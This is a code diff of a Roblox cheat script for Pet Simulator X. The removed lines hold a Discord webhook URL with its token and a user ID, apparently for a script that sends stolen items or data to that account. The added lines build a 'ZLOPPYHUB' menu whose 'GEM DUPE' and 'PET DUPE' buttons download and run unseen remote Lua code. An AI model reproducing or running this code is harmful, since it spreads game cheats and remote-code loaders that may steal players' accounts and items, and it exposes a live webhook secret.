@@ -1,3 +1,51 @@
-_G.UserID = 156761524
-_G.WebHook = "https://discord.com/api/webhooks/1054930429343432766/Ww1fJuk6TqzXg5Cxm8einoXcfuobB5_Wh9jMj-W7jiB5JtRwOjMOKZzRHzF-LMVOTiJH"
-loadsting(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua%27))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "(ZLOPPYHUB) [🎄 EVENT] Pet Simulator X!", HidePremium = false, IntroEnabled = false,SaveConfig = true, ConfigFolder = "OrionTest"})
+
+--Values
+
+
+
+
+--Functions
+
+
+
+
+
+local Tab = Window:MakeTab({
+	Name = "dupe",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "GEM DUPE💎",
+	Callback = function()
+	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ZloppyS/PetSimXDupe/main/GUISHIT'),true))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "PET DUPE!💵",
+	Callback = function()
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZloppyS/PetSimXDupe/main/PETSIMXNEWDUPE"))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "PET DUPE OTHER METHOD!🐶",
+	Callback = function()
+	    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZloppyS/PetSimXDupe/main/PetSimXdupe"))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "CLICK BEFORE HITTING DUPE THEN ALT TAB📢",
+	Callback = function()
+	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ZloppyS/PetSimXDupe/main/GUISHITT'),true))()
+      		print("button pressed")
+  	end    
+})
